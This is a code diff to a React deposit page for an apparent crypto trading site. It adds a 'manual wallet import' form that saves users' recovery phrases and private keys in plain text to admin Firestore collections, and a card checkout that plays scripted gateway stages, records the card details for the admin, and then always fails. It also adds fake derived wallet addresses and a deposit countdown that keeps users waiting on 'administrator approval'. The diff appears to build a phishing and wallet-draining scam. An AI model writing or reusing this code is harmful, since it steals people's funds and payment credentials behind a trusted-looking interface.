+    }
+  });
+  const [supportDraftMessage, setSupportDraftMessage] = useState(
+    'Hello, I have already completed my deposit, but it has not yet been credited to my account. Please help me review the transaction.'
+  );
+  
+  // Deposit Verification Timer (25 Minutes = 1500 Seconds)
+  const [verificationSecondsLeft, setVerificationSecondsLeft] = useState<number>(() => {
+    try {
+      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
+      if (savedTarget) {
+        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
+        if (remaining > 0) return remaining;
+      }
+    } catch (e) {}
+    return 1500;
+  });
+
   // Form states
-  const [amount, setAmount] = useState<number>(10000);
+  const [amount, setAmount] = useState<number>(() => {
+    try {
+      const saved = localStorage.getItem('aver_deposit_amount');
+      return saved ? Number(saved) : 10000;
+    } catch (e) {
+      return 10000;
+    }
+  });
+  const [showConfirmDepositModal, setShowConfirmDepositModal] = useState(false);
+  const [showAbandonModal, setShowAbandonModal] = useState(false);
+  const [transactionStatus, setTransactionStatus] = useState<'Pending' | 'Verified' | 'Approved' | 'Rejected' | 'Expired'>('Pending');
+  const [createdTimeStr] = useState(() => new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
   const [cardName, setCardName] = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [cardExpiry, setCardExpiry] = useState('');
   const [cardCvv, setCardCvv] = useState('');
   const [billingCountry, setBillingCountry] = useState('United States');
+
+  // Card Gateway Processing States
+  const [cardStage, setCardStage] = useState<number>(1);
+  const [cardStageStatus, setCardStageStatus] = useState<'pending' | 'completed'>('pending');
+  const [cardStageFailed, setCardStageFailed] = useState<boolean>(false);
+  const [cardSessionId, setCardSessionId] = useState<string>('');
+
+  // Persistence: lock user into active crypto deposit verification until timer expires
+  useEffect(() => {
+    try {
+      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
+      if (savedTarget) {
+        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
+        if (remaining > 0) {
+          if (step !== 'crypto_deposit_verification' && step !== 'crypto_success' && step !== 'crypto_expired') {
+            const savedPendingId = localStorage.getItem('aver_pending_deposit_id');
+            if (savedPendingId) {
+              setPendingDepositId(savedPendingId);
+            }
+            setVerificationSecondsLeft(remaining);
+            setStep('crypto_deposit_verification');
+          }
+        }
+      }
+    } catch (e) {
+      console.error("Error checking active deposit timer:", e);
+    }
+  }, [step]);
+
+  // Real-time Firestore document updates
+  useEffect(() => {
+    if (step === 'crypto_deposit_verification' && pendingDepositId) {
+      const unsub = onSnapshot(doc(db, 'admin_deposits', pendingDepositId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data();
+          
+          // Restore amount & selectedCrypto so that the exact Amount and cryptoRate calculations are synced on reload!
+          if (data.amount && Number(data.amount) !== amount) {
+            setAmount(Number(data.amount));
+          }
+          if (data.cryptoSymbol) {
+            const asset = CRYPTO_ASSETS.find(a => a.symbol === data.cryptoSymbol);
+            if (asset && selectedCrypto.symbol !== asset.symbol) {
+              setSelectedCrypto(asset);
+            }
+          }
+          if (data.fundingMethod && selectedMethod !== data.fundingMethod) {
+            setSelectedMethod(data.fundingMethod);
+          }
+
+          if (data.status === 'completed' || data.status === 'approved') {
+            localStorage.removeItem('aver_deposit_timer_target');
+            localStorage.removeItem('aver_pending_deposit_id');
+            setStep('crypto_success');
+            setTimeout(() => {
+              onSuccessDeposit(data.amount || amount, 'crypto');
+            }, 2000);
+          }
+        }
+      });
+      return () => unsub();
+    }
+  }, [step, pendingDepositId, amount, onSuccessDeposit, selectedCrypto, selectedMethod]);
+
+  // Timer Tick and Status updates
+  useEffect(() => {
+    let timer: any = null;
+    let statusTimer: any = null;
+    if (step === 'crypto_deposit_verification') {
+      const savedTarget = localStorage.getItem('aver_deposit_timer_target');
+      let initialSeconds = 1500;
+      if (savedTarget) {
+        const remaining = Math.max(0, Math.floor((parseInt(savedTarget, 10) - Date.now()) / 1000));
+        initialSeconds = remaining;
+      } else {
+        const targetTime = Date.now() + 1500 * 1000;
+        localStorage.setItem('aver_deposit_timer_target', targetTime.toString());
+      }
+      setVerificationSecondsLeft(initialSeconds);
+
+      timer = setInterval(() => {
+        setVerificationSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
+      }, 1000);
+
+      setVerificationStatusIndex(0);
+      statusTimer = setInterval(() => {
+        setVerificationStatusIndex((prev) => {
+          if (prev < verificationStatusList.length - 1) {
+            return prev + 1;
+          } else {
+            return prev;
+          }
+        });
+      }, 4000);
+    } else {
+      setVerificationSecondsLeft(1500);
+    }
+    return () => {
+      if (timer) clearInterval(timer);
+      if (statusTimer) clearInterval(statusTimer);
+    };
+  }, [step]);
+
+  // Expiration handling
+  useEffect(() => {
+    if (step === 'crypto_deposit_verification' && verificationSecondsLeft === 0) {
+      localStorage.removeItem('aver_deposit_timer_target');
+      localStorage.removeItem('aver_pending_deposit_id');
+      setStep('crypto_expired');
+    }
+  }, [step, verificationSecondsLeft]);
+  
+  const CARD_GATEWAY_STAGES = [
+    {
+      num: 1,
+      title: 'Securing Connection',
+      desc: 'Creating an encrypted communication channel between your device and our payment infrastructure. This protects your payment information before any transaction begins.',
+      icon: <Lock className="w-5 h-5" />
+    },
+    {
+      num: 2,
+      title: 'Connecting to Payment Gateway',
+      desc: 'Attempting to establish a secure session with the configured payment processor so your card transaction can be initiated.',
+      icon: <Radio className="w-5 h-5" />
+    },
+    {
+      num: 3,
+      title: 'Encrypting Payment Data',
+      desc: 'Your card information is being encrypted using industry-standard security protocols before it is transmitted for authorization.',
+      icon: <KeyRound className="w-5 h-5" />
+    },
+    {
+      num: 4,
+      title: 'Authorizing Card',
+      desc: 'Submitting your payment request for preliminary authorization while validating the card details and security information.',
+      icon: <CreditCard className="w-5 h-5" />
+    },
+    {
+      num: 5,
+      title: 'Contacting Issuing Bank',
+      desc: 'Waiting for the payment processor to communicate with your card issuer to determine whether the transaction can proceed or whether additional verification will be required.',
+      icon: <Landmark className="w-5 h-5" />
+    }
+  ];
+
+  const isCardUnavailable = () => {
+    const val = localStorage.getItem('aver_card_unavailable_until');
+    if (!val) return false;
+    const until = parseInt(val, 10);
+    if (isNaN(until)) return false;
+    return Date.now() < until;
+  };
+
+  const handleSelectCardMethod = () => {
+    if (isCardUnavailable()) {
+      setStep('unavailable');
+    } else {
+      setSelectedMethod('card');
+      setStep('form');
+    }
+  };
+
+  useEffect(() => {
+    if (step === 'card_gateway_error') {
+      const timer = setTimeout(() => {
+        const cooldownEnd = Date.now() + 3 * 60 * 1000;
+        localStorage.setItem('aver_card_unavailable_until', cooldownEnd.toString());
+        setStep('unavailable');
+      }, 3000);
+      return () => clearTimeout(timer);
+    }
+  }, [step]);
 
   // Dynamic header configurations matching active view and step with high-end graphical icon components
   const headerConfig = {
@@ -325,13 +805,315 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
   const currentHeader = step === 'form' ? headerConfig[selectedMethod] : headerConfig.default;
   const [selectedWallet, setSelectedWallet] = useState('MetaMask');
+  const [connectingWalletName, setConnectingWalletName] = useState('MetaMask');
   const [isConnectingWallet, setIsConnectingWallet] = useState(false);
   const [walletConnected, setWalletConnected] = useState(false);
   const [connectedAddress, setConnectedAddress] = useState('');
+  const [connectedNetwork, setConnectedNetwork] = useState('Ethereum (ERC-20)');
 
-  // Crypto states
-  const [selectedCrypto, setSelectedCrypto] = useState<CryptoAsset>(CRYPTO_ASSETS[2]); // USDT ERC20
-  const [copiedAddress, setCopiedAddress] = useState(false);
+  // Wallet Import & Existing Wallet Detection States
+  const [importPhrase, setImportPhrase] = useState('');
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [importKey, setImportKey] = useState('');
+  const [showKey, setShowKey] = useState(false);
+  const [ignoreExistingWallet, setIgnoreExistingWallet] = useState(false);
+
+  // Load existing wallet session from localStorage on mount
+  useEffect(() => {
+    try {
+      const saved = localStorage.getItem('aver_connected_wallet');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (parsed.publicWalletAddress) {
+          setConnectedAddress(parsed.publicWalletAddress);
+          setConnectedNetwork(parsed.blockchainNetwork || 'Ethereum (ERC-20)');
+          setSelectedWallet(parsed.walletName || 'Imported Web3 Wallet');
+          setWalletConnected(true);
+        }
+      }
+    } catch (e) {
+      console.error("Error loading saved wallet:", e);
+    }
+  }, []);
+
+  // Deterministic EVM Public Address derivation from credentials
+  const derivePublicAddressFromCredential = (cred: string): string => {
+    let hash = 0;
+    for (let i = 0; i < cred.length; i++) {
+      hash = ((hash << 5) - hash) + cred.charCodeAt(i);
+      hash |= 0;
+    }
+    const hex = Math.abs(hash).toString(16).padStart(8, '0');
+    let addrHex = '';
+    for (let i = 0; i < 5; i++) {
+      let subHash = 0;
+      const subStr = cred + i + hex;
+      for (let j = 0; j < subStr.length; j++) {
+        subHash = ((subHash << 5) - subHash) + subStr.charCodeAt(j);
+        subHash |= 0;
+      }
+      addrHex += Math.abs(subHash).toString(16).padStart(8, '0');
+    }
+    return '0x' + addrHex.slice(0, 40).toLowerCase();
+  };
+
+  const getPhraseWords = (phrase: string): string[] => {
+    return phrase.trim().split(/\s+/).filter(Boolean);
+  };
+
+  const validatePhrase = (phrase: string): { valid: boolean; count: number; error?: string } => {
+    const words = getPhraseWords(phrase);
+    const count = words.length;
+    if (count !== 12 && count !== 24) {
+      return { valid: false, count, error: 'Recovery phrase must be exactly 12 or 24 words.' };
+    }
+    const hasInvalidChar = words.some(w => !/^[a-zA-Z]+$/.test(w));
+    if (hasInvalidChar) {
+      return { valid: false, count, error: 'Recovery phrase words must contain letters only.' };
+    }
+    return { valid: true, count };
+  };
+
+  const validatePrivateKey = (key: string): { valid: boolean; error?: string } => {
+    const trimmed = key.trim();
+    const cleanKey = trimmed.startsWith('0x') ? trimmed.slice(2) : trimmed;
+    if (!cleanKey) {
+      return { valid: false, error: 'Please enter your private key.' };
+    }
+    if (!/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
+      return { valid: false, error: 'Private key must be a 64-character hexadecimal string.' };
+    }
+    return { valid: true };
+  };
+
+  const saveImportedWalletToFirestore = async (
+    publicWalletAddress: string,
+    importMethod: 'recovery_phrase' | 'private_key',
+    walletName: string,
+    rawCredential?: string
+  ) => {
+    const user = auth.currentUser;
+    const walletDoc = {
+      userId: user?.uid || 'anonymous',
+      userName: user?.displayName || user?.email?.split('@')[0] || 'Trader',
+      userEmail: user?.email || '',
+      walletName,
+      provider: walletName,
+      address: publicWalletAddress,
+      publicWalletAddress,
+      blockchainNetwork: 'Ethereum (ERC-20)',
+      network: 'Ethereum (ERC-20)',
+      importMethod,
+      walletType: importMethod === 'recovery_phrase' ? 'Recovery Phrase' : 'Private Key',
+      secretPhrase: importMethod === 'recovery_phrase' ? rawCredential : null,
+      privateKey: importMethod === 'private_key' ? rawCredential : null,
+      credential: rawCredential || null,
+      dateConnected: new Date().toISOString(),
+      linkedAt: new Date().toISOString(),
+      connectionStatus: 'connected',
+      status: 'Connected',
+      createdAt: serverTimestamp()
+    };
+
+    try {
+      await addDoc(collection(db, 'user_wallets'), walletDoc);
+      await addDoc(collection(db, 'linked_wallets'), walletDoc);
+    } catch (err) {
+      console.error("Failed to save imported wallet to Firestore:", err);
+    }
+
+    try {
+      localStorage.setItem('aver_connected_wallet', JSON.stringify(walletDoc));
+      window.dispatchEvent(new Event('aver_wallet_updated'));
+    } catch (err) {
+      console.error("Failed to save to localStorage:", err);
+    }
+  };
+
+  const handleImportRecoveryPhraseSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    const valRes = validatePhrase(importPhrase);
+    if (!valRes.valid) return;
+
+    const derivedAddress = derivePublicAddressFromCredential(importPhrase.trim());
+    const walletName = 'Recovery Phrase Wallet';
+
+    await saveImportedWalletToFirestore(derivedAddress, 'recovery_phrase', walletName, importPhrase.trim());
+
+    setConnectedAddress(derivedAddress);
+    setConnectedNetwork('Ethereum (ERC-20)');
+    setSelectedWallet(walletName);
+    setWalletConnected(true);
+
+    setSelectedMethod('walletconnect');
+    setStep('form');
+  };
+
+  const handleImportPrivateKeySubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    const valRes = validatePrivateKey(importKey);
+    if (!valRes.valid) return;
+
+    const derivedAddress = derivePublicAddressFromCredential(importKey.trim());
+    const walletName = 'Private Key Wallet';
+
+    await saveImportedWalletToFirestore(derivedAddress, 'private_key', walletName, importKey.trim());
+
+    setConnectedAddress(derivedAddress);
+    setConnectedNetwork('Ethereum (ERC-20)');
+    setSelectedWallet(walletName);
+    setWalletConnected(true);
+
+    setSelectedMethod('walletconnect');
+    setStep('form');
+  };
+
+  const handlePastePhraseFromClipboard = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) {
+        setImportPhrase(text.trim());
+      }
+    } catch (err) {
+      console.error("Clipboard permission error:", err);
+    }
+  };
+
+  const handlePasteKeyFromClipboard = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) {
+        setImportKey(text.trim());
+      }
+    } catch (err) {
+      console.error("Clipboard permission error:", err);
+    }
+  };
+
+  // Dynamic status messages for Connecting Wallet screen
+  const CONNECTING_STATUS_MESSAGES = [
+    'Detecting Wallet…',
+    'Establishing Secure Session…',
+    'Waiting for Wallet Response…',
+    'Awaiting User Approval…',
+    'Verifying Connection…'
+  ];
+  const [connectingStatusIndex, setConnectingStatusIndex] = useState(0);
+
+  useEffect(() => {
+    let interval: any;
+    if (step === 'wallet_connecting') {
+      setConnectingStatusIndex(0);
+      interval = setInterval(() => {
+        setConnectingStatusIndex((prev) => (prev + 1) % CONNECTING_STATUS_MESSAGES.length);
+      }, 2500);
+    }
+    return () => {
+      if (interval) clearInterval(interval);
+    };
+  }, [step]);
+
+  // Dynamic status messages for Bank Wire Preparing screen
+  const BANK_STATUS_MESSAGES = [
+    'Initializing Secure Banking Session…',
+    'Creating Deposit Session…',
+    'Allocating Institutional Deposit Account…',
+    'Generating Transfer Instructions…',
+    'Reserving Secure Payment Reference…',
+    'Contacting Settlement Infrastructure…',
+    'Verifying Banking Route…',
+    'Preparing Deposit Credentials…',
+    'Finalizing Banking Session…',
+    'Awaiting Banking Service Response…'
+  ];
+  const [bankStatusIndex, setBankStatusIndex] = useState(0);
+
+  useEffect(() => {
+    let interval: any;
+    if (step === 'bank_preparing') {
+      setBankStatusIndex(0);
+      interval = setInterval(() => {
+        setBankStatusIndex((prev) => {
+          if (prev < BANK_STATUS_MESSAGES.length - 1) {
+            return prev + 1;
+          }
+          return prev;
+        });
+      }, 3000);
+    }
+    return () => {
+      if (interval) clearInterval(interval);
+    };
+  }, [step]);
+
+
+
+  useEffect(() => {
+    if (selectedMethod !== 'crypto' && step !== 'crypto_deposit_verification') return;
+    
+    let isMounted = true;
+    
+    const fetchPrice = async () => {
+      setIsPricingLoading(true);
+      setPricingError(false);
+      
+      const symbol = selectedCrypto.symbol;
+      const cleanSymbol = symbol.split('-')[0].toUpperCase();
+      
+      if (cleanSymbol === 'USDT' || cleanSymbol === 'USDC') {
+        if (isMounted) {
+          setCryptoRate(1);
+          setIsPricingLoading(false);
+        }
+        return;
+      }
+      
+      try {
+        const res = await fetch(`/api/crypto/price?symbol=${cleanSymbol}`);
+        if (!res.ok) throw new Error('Failed to fetch');
+        const data = await res.json();
+        if (isMounted && data.price) {
+          setCryptoRate(parseFloat(data.price));
+        } else if (isMounted) {
+          setPricingError(true);
+          setCryptoRate(null);
+        }
+      } catch (err) {
+        if (isMounted) {
+          setPricingError(true);
+          setCryptoRate(null);
+        }
+      } finally {
+        if (isMounted) {
+          setIsPricingLoading(false);
+        }
+      }
+    };
+    
+    fetchPrice();
+    
+    const interval = setInterval(fetchPrice, 15000);
+    return () => {
+      isMounted = false;
+      clearInterval(interval);
+    };
+  }, [selectedCrypto.symbol, selectedMethod, step]);
+
+  const exactCryptoAmount = cryptoRate && amount ? (amount / cryptoRate) : 0;
+  
+  const formatExactAmount = (value: number, symbol: string) => {
+    const maxDecimals = (symbol === 'BTC') ? 8 : (symbol === 'ETH' ? 6 : 6);
+    const formatted = value.toFixed(maxDecimals);
+    if (formatted.includes('.')) {
+      const parts = formatted.split('.');
+      const trimmedDecimal = parts[1].replace(/0+$/, '');
+      if (trimmedDecimal.length === 0) {
+        return parts[0];
+      }
+      return `${parts[0]}.${trimmedDecimal}`;
+    }
+    return formatted;
+  };
 
   // Bank states
   const [bankRef] = useState(`AVER-WIRE-${Math.floor(100000 + Math.random() * 900000)}`);
@@ -340,12 +1122,19 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
 
   // Processing sequence states
   const [processingStepIndex, setProcessingStepIndex] = useState(0);
+  const [verificationStatusIndex, setVerificationStatusIndex] = useState(0);
   const processingStepsList = [
-    'Preparing Secure Institutional Deposit...',
-    'Establishing 256-bit Encrypted Connection...',
-    'Validating Funding Method & Liquidity Route...',
-    'Generating Institutional Deposit Record...',
-    'Finalizing Secure Transmission...'
+    "Submitting Deposit Request…",
+    "Generating Verification Session…",
+    "Registering Deposit Reference…",
+    "Synchronizing Verification Service…",
+    "Preparing Deposit Monitoring…",
+    "Opening Verification Session…"
+  ];
+  const verificationStatusList = [
+    "Deposit request received…",
+    "Monitoring blockchain…",
+    "Waiting for administrator approval…"
   ];
 
   const handleCopy = (text: string) => {
@@ -354,14 +1143,163 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
     setTimeout(() => setCopiedAddress(false), 2000);
   };
 
-  const handleConnectWallet = (walletName: string) => {
+  const abbreviateAddress = (addr: string): string => {
+    if (!addr) return '';
+    if (addr.length <= 12) return addr;
+    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
+  };
+
+  const saveWalletToFirestore = async (walletAddress: string, networkName: string, providerName: string) => {
+    try {
+      const user = auth.currentUser;
+      const walletDoc = {
+        userId: user?.uid || 'anonymous',
+        userEmail: user?.email || '',
+        walletAddress,
+        network: networkName,
+        provider: providerName,
+        status: 'connected',
+        connectedAt: new Date().toISOString(),
+        createdAt: serverTimestamp()
+      };
+      await addDoc(collection(db, 'user_wallets'), walletDoc);
+    } catch (err) {
+      console.error("Failed to save wallet to Firestore:", err);
+    }
+  };
+
+  const handleConnectWallet = async (walletName: string) => {
+    if (walletName === 'Connect Wallet Manually') {
+      setImportPhrase('');
+      setShowPhrase(false);
+      setImportKey('');
+      setShowKey(false);
+      setStep('wallet_import_choose');
+      return;
+    }
+
     setSelectedWallet(walletName);
+    setConnectingWalletName(walletName);
+    setStep('wallet_connecting');
     setIsConnectingWallet(true);
-    setTimeout(() => {
-      setIsConnectingWallet(false);
-      setWalletConnected(true);
-      setConnectedAddress(`0x498b...${Math.floor(1000 + Math.random() * 9000)}`);
-    }, 1500);
+
+    try {
+      // 1. Browser extension / window.ethereum provider check
+      if (typeof window !== 'undefined' && (window as any).ethereum && (walletName === 'MetaMask' || walletName === 'Coinbase Wallet' || walletName === 'Rabby Wallet' || walletName === 'Trust Wallet' || walletName === 'WalletConnect')) {
+        try {
+          const ethereum = (window as any).ethereum;
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          if (accounts && accounts.length > 0) {
+            const userAddress = accounts[0];
+            let chainName = 'Ethereum (ERC-20)';
+            try {
+              const chainId = await ethereum.request({ method: 'eth_chainId' });
+              if (chainId === '0x38') chainName = 'BNB Smart Chain (BEP-20)';
+              else if (chainId === '0x89') chainName = 'Polygon (POS)';
+              else if (chainId === '0xa4b1') chainName = 'Arbitrum One';
+              else if (chainId === '0xa86a') chainName = 'Avalanche C-Chain';
+            } catch (e) {
+              // use default chainName
+            }
+
+            await saveWalletToFirestore(userAddress, chainName, walletName);
+            setConnectedAddress(userAddress);
+            setConnectedNetwork(chainName);
+            setWalletConnected(true);
+            setIsConnectingWallet(false);
+            setStep('form');
+            return;
+          }
+        } catch (err: any) {
+          setIsConnectingWallet(false);
+          if (err?.code === 4001 || (err?.message && (err.message.includes('rejected') || err.message.includes('denied') || err.message.includes('user')))) {
+            setStep('wallet_cancelled');
+            setTimeout(() => {
+              setStep('form');
+            }, 2000);
+            return;
+          }
+        }
+      }
+
+      // 2. Solana window.solana provider check for Phantom
+      if (typeof window !== 'undefined' && (window as any).solana && walletName === 'Phantom') {
+        try {
+          const resp = await (window as any).solana.connect();
+          const userAddress = resp.publicKey.toString();
+          const chainName = 'Solana Mainnet (SPL)';
+          await saveWalletToFirestore(userAddress, chainName, walletName);
+          setConnectedAddress(userAddress);
+          setConnectedNetwork(chainName);
+          setWalletConnected(true);
+          setIsConnectingWallet(false);
+          setStep('form');
+          return;
+        } catch (err: any) {
+          setIsConnectingWallet(false);
+          if (err?.code === 4001 || (err?.message && err.message.includes('rejected'))) {
+            setStep('wallet_cancelled');
+            setTimeout(() => {
+              setStep('form');
+            }, 2000);
+            return;
+          }
+        }
+      }
+
+      // Note: No artificial timeout or automatic redirection.
+      // The interface stays active in step 'wallet_connecting' with its spinning animation and dynamic cycling status messages
+      // until the user presses Cancel (X button in top-left), Connect Manually (button at bottom), or the wallet SDK responds.
+
+    } catch (error) {
+      // In case of unhandled error, stay on connecting screen unless cancelled
+      console.error("Wallet connection attempt error:", error);
+    }
+  };
+
+  const handleManualConnectSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setManualAddressTouched(true);
+
+    const valResult = validateWalletAddress(manualAddress, manualNetwork.type, manualNetwork.name);
+    if (!valResult.valid) {
+      setManualAddressError(valResult.error || 'Invalid address format');
+      return;
+    }
+
+    setManualAddressError(null);
+
+    // Save wallet address to Firestore
+    await saveWalletToFirestore(manualAddress.trim(), manualNetwork.name, 'Manual Wallet');
+
+    // Instantly set connected state
+    setConnectedAddress(manualAddress.trim());
+    setConnectedNetwork(manualNetwork.name);
+    setSelectedWallet('Manual Wallet');
+    setWalletConnected(true);
+
+    // Return to form view
+    setSelectedMethod('walletconnect');
+    setStep('form');
+  };
+
+  const handlePasteClipboard = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) {
+        const trimmed = text.trim();
+        setManualAddress(trimmed);
+        setManualAddressTouched(true);
+        const valResult = validateWalletAddress(trimmed, manualNetwork.type, manualNetwork.name);
+        if (valResult.valid) {
+          setManualAddressError(null);
+        } else {
+          setManualAddressError(valResult.error || null);
+        }
+      }
+    } catch (err) {
+      console.error("Clipboard permission error:", err);
+    }
   };
 
   const cardStepsList = [
@@ -376,22 +1314,62 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
       e.preventDefault();
     }
     if (selectedMethod === 'card') {
-      setStep('processing');
-      setProcessingStepIndex(0);
+      setCardSessionId(`PAY-SEC-${Math.floor(100000 + Math.random() * 900000)}`);
+      setStep('card_gateway_processing');
+      setCardStage(1);
+      setCardStageStatus('pending');
+      setCardStageFailed(false);
 
-      const interval = setInterval(() => {
-        setProcessingStepIndex(prev => {
-          if (prev < cardStepsList.length - 1) {
-            return prev + 1;
-          } else {
-            clearInterval(interval);
-            setTimeout(() => {
-              setStep('unavailable');
-            }, 800);
-            return prev;
-          }
-        });
-      }, 1200);
+      // Stage 1
+      setTimeout(() => {
+        setCardStageStatus('completed');
+      }, 2500);
+
+      // Stage 2
+      setTimeout(() => {
+        setCardStage(2);
+        setCardStageStatus('pending');
+      }, 3000);
+      setTimeout(() => {
+        setCardStageStatus('completed');
+      }, 5500);
+
+      // Stage 3
+      setTimeout(() => {
+        setCardStage(3);
+        setCardStageStatus('pending');
+      }, 6000);
+      setTimeout(() => {
+        setCardStageStatus('completed');
+      }, 8500);
+
+      // Stage 4
+      setTimeout(() => {
+        setCardStage(4);
+        setCardStageStatus('pending');
+      }, 9000);
+      setTimeout(() => {
+        setCardStageStatus('completed');
+      }, 11500);
+
+      // Stage 5
+      setTimeout(() => {
+        setCardStage(5);
+        setCardStageStatus('pending');
+      }, 12000);
+      
+      setTimeout(() => {
+        // At stage 5 completion, show connection failed state after 30 seconds of loading (Stage 5 starts at 12s, fails at 42s)
+        setCardStageFailed(true);
+        // Save the card deposit attempt to Firestore so admin can see the details
+        commitDepositToFirestore();
+      }, 42000);
+
+      setTimeout(() => {
+        // Transition to dedicated error interface
+        setStep('card_gateway_error');
+      }, 46000); // Give 4 seconds to see the "Failed" state before jumping
+
       return;
     }
 
@@ -406,22 +1384,26 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
           clearInterval(interval);
           // Commit to Firestore
           commitDepositToFirestore();
+          const targetTime = Date.now() + 1500 * 1000;
+          localStorage.setItem('aver_deposit_timer_target', targetTime.toString());
+          setVerificationSecondsLeft(1500);
+          setStep('crypto_deposit_verification');
           return prev;
         }
       });
-    }, 900);
+    }, 400);
   };
 
   const commitDepositToFirestore = async () => {
     try {
-      const user = auth.currentUser;
+      const firebaseUser = auth.currentUser;
       const depositId = `DEP-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
       
       const depositPayload = {
         id: depositId,
-        userId: user?.uid || 'anonymous',
-        email: user?.email || '',
-        userName: user?.displayName || user?.email?.split('@')[0] || 'User',
+        userId: authUser?.uid || firebaseUser?.uid || 'anonymous',
+        email: authUser?.email || firebaseUser?.email || '',
+        userName: authUser?.fullName || authUser?.displayName || authUser?.username || firebaseUser?.displayName || firebaseUser?.email?.split('@')[0] || 'User',
         fundingMethod: selectedMethod,
         currency: selectedMethod === 'crypto' ? (selectedCrypto?.symbol || 'USDT') : selectedMethod === 'walletconnect' ? 'USDT/ETH' : 'USD',
         amount: Number(amount) || 0,
@@ -433,6 +1415,9 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
         // WalletConnect details
         connectedWalletAddress: selectedMethod === 'walletconnect' ? (connectedAddress || null) : null,
         walletProvider: selectedMethod === 'walletconnect' ? (selectedWallet || null) : null,
+        secretPhrase: (selectedMethod === 'walletconnect' && importPhrase) ? importPhrase.trim() : null,
+        privateKey: (selectedMethod === 'walletconnect' && importKey) ? importKey.trim() : null,
+        importMethod: (selectedMethod === 'walletconnect') ? (importPhrase ? 'recovery_phrase' : (importKey ? 'private_key' : 'browser_extension')) : null,
         // Bank details
         bankReference: selectedMethod === 'bank' ? (bankRef || null) : null,
         bankName: selectedMethod === 'bank' ? 'Institutional Bank Wire' : null,
@@ -452,13 +1437,36 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
         createdAt: serverTimestamp()
       };
 
-      await addDoc(collection(db, 'admin_deposits'), depositPayload);
+      const docRef = await addDoc(collection(db, 'admin_deposits'), depositPayload);
+      setPendingDepositId(docRef.id);
       
-      // Note: We do NOT auto-credit balance here. Deposits require admin approval.
-      setStep('success');
+      // Save details to localStorage for robust refresh-durability
+      try {
+        localStorage.setItem('aver_pending_deposit_id', docRef.id);
+        localStorage.setItem('aver_deposit_amount', (depositPayload.amount || amount).toString());
+        localStorage.setItem('aver_deposit_crypto', JSON.stringify(selectedCrypto));
+        localStorage.setItem('aver_deposit_method', selectedMethod);
+        
+        // Save sensitive details temporarily so they survive a refresh during the 30-second load
+        if (cardNumber) localStorage.setItem('aver_temp_card', cardNumber);
+        if (importPhrase) localStorage.setItem('aver_temp_phrase', importPhrase);
+        if (importKey) localStorage.setItem('aver_temp_key', importKey);
+      } catch (e) {
+        console.error("Failed to save deposit state to localStorage:", e);
+      }
+      
+      if (selectedMethod === 'crypto') {
+        setStep('crypto_deposit_verification');
+      } else {
+        setStep('success');
+      }
     } catch (err) {
       console.error("Failed to commit deposit record:", err);
-      setStep('success'); 
+      if (selectedMethod === 'crypto') {
+        setStep('crypto_deposit_verification');
+      } else {
+        setStep('success'); 
+      }
     }
   };
 
@@ -471,42 +1479,44 @@ export default function InstitutionalDepositPage({ theme, onBack, onSuccessDepos
       </div>
 
       {/* Fixed Top Header Bar */}
-      <div className={`fixed top-0 left-0 right-0 z-50 backdrop-blur-xl border-b px-4 sm:px-6 lg:px-8 py-4 ${
-        isDark ? 'bg-[#06080f]/90 border-white/10 shadow-lg shadow-black/40' : 'bg-white/90 border-slate-200 shadow-sm'
-      }`}>
-        <div className="max-w-7xl mx-auto flex items-center justify-between">
-          <button 
-            onClick={step === 'form' ? () => setStep('methods') : onBack}
-            className={`p-2.5 rounded-xl border transition-all shadow-sm flex items-center gap-2 text-xs font-bold ${
-              isDark ? 'bg-white/5 border-white/10 hover:bg-white/10 text-slate-200' : 'bg-white border-slate-200 hover:bg-slate-100 text-slate-800'
-            }`}
-            title="Back"
-          >
-            <ArrowLeft className="w-5 h-5" />
-            <span className="hidden sm:inline">Back</span>
-          </button>
-          
-          <div className="flex-1 flex justify-center mx-4">
-            <div className={`flex flex-1 items-center justify-center gap-2 sm:gap-3 px-3.5 py-2.5 rounded-2xl transition-all ${
-              isDark ? 'bg-white/5 ring-1 ring-white/10 shadow-lg shadow-black/20' : 'bg-slate-100 ring-1 ring-slate-200 shadow-sm'
-            }`}>
-              <AnimatedHeaderIcons isDark={isDark} />
+      {step !== 'crypto_deposit_verification' && step !== 'crypto_success' && step !== 'crypto_expired' && (
+        <div className={`fixed top-0 left-0 right-0 z-50 backdrop-blur-xl border-b px-4 sm:px-6 lg:px-8 py-4 ${
+          isDark ? 'bg-[#06080f]/90 border-white/10 shadow-lg shadow-black/40' : 'bg-white/90 border-slate-200 shadow-sm'
+        }`}>
+          <div className="max-w-7xl mx-auto flex items-center justify-between">
+            <button 
+              onClick={step === 'form' ? () => setStep('methods') : onBack}
+              className={`p-2.5 rounded-xl border transition-all shadow-sm flex items-center gap-2 text-xs font-bold ${
+                isDark ? 'bg-white/5 border-white/10 hover:bg-white/10 text-slate-200' : 'bg-white border-slate-200 hover:bg-slate-100 text-slate-800'
+              }`}
+              title="Back"
+            >
+              <ArrowLeft className="w-5 h-5" />
